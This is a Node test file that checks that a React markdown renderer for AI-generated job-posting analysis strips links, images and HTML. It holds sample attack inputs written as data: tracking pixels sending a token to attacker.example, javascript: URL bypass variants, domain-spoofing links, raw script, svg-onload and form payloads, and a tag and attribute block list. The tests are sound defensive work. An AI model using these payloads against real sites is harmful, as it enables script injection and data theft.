import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { createRequire } from "node:module";
import test from "node:test";
import vm from "node:vm";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ts from "typescript";

const source = await readFile(new URL("../app/safe-analysis-markdown.tsx", import.meta.url), "utf8");
const compiled = ts.transpileModule(source, {
  compilerOptions: {
    module: ts.ModuleKind.CommonJS,
    target: ts.ScriptTarget.ES2022,
    jsx: ts.JsxEmit.ReactJSX,
    esModuleInterop: true,
  },
}).outputText;
const exports = {};
vm.runInNewContext(compiled, { exports, require: createRequire(import.meta.url) });
const render = (markdown) => renderToStaticMarkup(createElement(exports.default, null, markdown));

function assertPassiveHtml(html) {
  assert.doesNotMatch(html, /<(?:a|img|script|iframe|object|embed|svg|style|link|video|audio|source|form|input)\b/i);
  assert.doesNotMatch(html, /\s(?:href|src|srcset|poster|onerror|onload|onclick|action|formaction)\s*=/i);
}

test("AI 图片、引用图片和嵌套图片不会生成图片或资源预加载", () => {
  for (const markdown of [
    "![跟踪像素](https://attacker.example/pixel?token=secret)",
    "![协议相对](//attacker.example/pixel)",
    "![内嵌资源](data:image/svg+xml;base64,PHN2Zy8+)",
    "![引用图片][pixel]\n\n[pixel]: https://attacker.example/pixel",
    "[![嵌套图片](https://attacker.example/pixel)](https://attacker.example/login)",
  ]) {
    const html = render(markdown);
    assertPassiveHtml(html);
    assert.match(html, /图片已禁用/);
    assert.doesNotMatch(html, /attacker\.example|data:image/);
  }
});

test("AI 生成的所有链接仅保留文本，包含编码和协议绕过样例", () => {
  for (const markdown of [
    "[普通链接](https://attacker.example/login)",
    "[HTTP](http://attacker.example/)",
    "[协议相对](//attacker.example/)",
    "[相对路径](/api/analyze)",
    "[脚本](javascript:alert%281%29)",
    "[大小写](JaVaScRiPt:alert%281%29)",
    "[实体](java&#x73;cript:alert%281%29)",
    "[控制字符](java&#10;script:alert%281%29)",
    "[编码](%6a%61%76%61%73%63%72%69%70%74:alert%281%29)",
    "[凭据伪装](https://www.zj.gov.cn@attacker.example/login)",
    "[子域伪装](https://www.zj.gov.cn.attacker.example/login)",
    "[反斜杠](https:\\\\attacker.example/login)",
    "[引用链接][target]\n\n[target]: https://attacker.example/login",
    "自动链接 https://attacker.example/login 与 <https://attacker.example/login>",
    "联系 foo@attacker.example 与 <foo@attacker.example>",
  ]) {
    const html = render(markdown);
    assertPassiveHtml(html);
    assert.match(html, /链接已禁用/);
  }
});

test("HTML、脚本和事件处理器不会被解释为可执行内容", () => {
  const html = render([
    '<script>alert("xss")</script>',
    '<img src="https://attacker.example/pixel" onerror="alert(1)">',
    '<iframe src="https://attacker.example/"></iframe>',
    '<svg onload="alert(1)"><image href="https://attacker.example/pixel" /></svg>',
    '<a href="javascript:alert(1)" onclick="alert(2)">伪装链接</a>',
    '<form action="https://attacker.example/"><input name="key"></form>',
    "普通文字仍显示。",
  ].join("\n\n"));
  assertPassiveHtml(html);
  assert.match(html, /普通文字仍显示/);
  assert.doesNotMatch(html, /attacker\.example|alert\(/);
});

test("正常中文、GFM 表格、列表和代码保持可读", () => {
  const html = render([
    "# 岗位分析",
    "**证据不足**，需核对当年公告。",
    "| 岗位 | 招录人数 |\n| --- | ---: |\n| 杭州市岗位 | 2 |",
    "- 保留资格底线\n- 核验历史口径",
    "`<img>` 是文字代码。",
  ].join("\n\n"));
  assertPassiveHtml(html);
  assert.match(html, /<h1>岗位分析<\/h1>/);
  assert.match(html, /<strong>证据不足<\/strong>/);
  assert.match(html, /<table>/);
  assert.match(html, /<th>岗位<\/th>/);
  assert.match(html, /杭州市岗位/);
  assert.match(html, /<ul>/);
  assert.match(html, /<code>&lt;img&gt;<\/code>/);
});
